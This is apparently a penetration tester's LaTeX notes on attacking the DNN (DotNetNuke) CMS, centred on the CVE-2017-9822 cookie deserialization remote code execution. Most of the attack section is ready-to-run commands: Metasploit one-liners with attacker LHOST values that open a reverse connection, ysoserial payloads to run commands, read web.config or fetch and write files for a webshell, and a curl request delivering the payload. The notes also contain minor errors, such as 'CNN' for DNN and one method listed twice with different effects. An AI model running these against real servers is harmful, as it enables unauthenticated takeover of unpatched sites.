\section{Notes}

\subsection{Intro}

\verb+DNN+ (formerly \verb+DotNetNuke+) is an open-source Content Management System (CMS), written in \verb+C#+ and based on the \verb+.NET+ framework. A number of core features can be expended through a large panel of third-party (or in-house) apps and modules to extend the CMS basic functionalities.

\subsection{Enum}

\subsubsection{Version}

Version disclosure

The \verb+/Documentation/License.txt+ file, if present, may hold information about the release year of the DotNetNuke version being used by the webserver.

\begin{verbatim}
msfconsole -q -x 'use windows/http/dnn_cookie_deserialization_rce;set LHOST 10.10.16.179; set RHOSTS 10.10.110.10; set RPORT 80;run'
\end{verbatim}

\subsubsection{robots.txt}


\subsection{Vulns}

\begin{verbatim}
searchsploit DotNetNuke
\end{verbatim}


\subsubsection{Cookie Deserialization Remote Code Execution (CVE-2017-9822)}
A deserialization vulnerability is present in versions 5.0.0 to 9.3.0-RC, which can be leveraged to remotely execute code on the underlying system without authentication. The vulnerability lies in the deserialization of the \verb+DNNPersonalization+ cookie (XML format), used to store (authenticated or unauthenticated) user's preferences. This cookie is notably processed during handling of \verb+404+ errors if the built-in default DNN's missing page is used.

While the object type to deserialize is user-controlled in the \verb+DNNPersonalization+ cookie, the \verb+XmlSerializer+ class (used by CNN for the processing) cannot be used to serialize / deserialize types with interface members. As stated in the original  \href{https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf}{research paper}, the \verb+ObjectDataProvider+ class can be used in combination with one of the following methods:
\begin{itemize}
    \item \verb+XamlReader.Load(String)+: leading to RCE
    \item \verb+ObjectStateFormatter.Deserialize(String)+: leading to RCE
    \item \verb+DotNetNuke.Common.Utilities.FileSystemUtils.PullFile(String)+: arbitrary file write (upload a webshell)
    \item \verb+DotNetNuke.Common.Utilities.FileSystemUtils.PullFile(String)+: arbitrary file read
\end{itemize}

The initial vulnerability is identified by CVE-2017-9822, with a number of bypass of the attempts at fixing the initial bug identified as CVE-2018-15811, CVE-2018-15812, CVE-2018-15825, and CVE-2018-15826

\href{https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization}{Metasploit dnn_cookie_deserialization_rce}:
\begin{verbatim}
sudo msfconsole -x 'use windows/http/dnn_cookie_deserialization_rce; set LHOST tun0 ; set LPORT 445;set RHOSTS 10.10.110.10; set RPORT 80;run'
\end{verbatim}

using ysoserial (pre-patching CVE-2017-9822):
\begin{verbatim}
ysoserial.exe -p DotNetNuke -m run_command -c "<COMMAND>"
ysoserial.exe -p DotNetNuke -m read_file -f "<FILE | FILE_FULL_PATH>"
ysoserial.exe -p DotNetNuke -m write_file -u "<FILE_TO_FETCH_URL>" -f "<FILE>"

# Retrieves the "web.config" configuration file (in its default location) in order to identify the webserver hosted directories for the upload o a webshell.
.\ysoserial.exe -p DotNetNuke -m read_file -f C:\DotNetNuke\web.config
\end{verbatim}


The generated serialized cookie can then be sent to a non-existing page using, for example, the curl utility:
\begin{verbatim}
curl -i -s -k -X 'GET' \
-b '.DOTNETNUKE=;DNNPersonalization=<SERIALIZED_PAYLOAD>' \
'http://<target>/pagedoesnotexist123456789abc'
\end{verbatim}

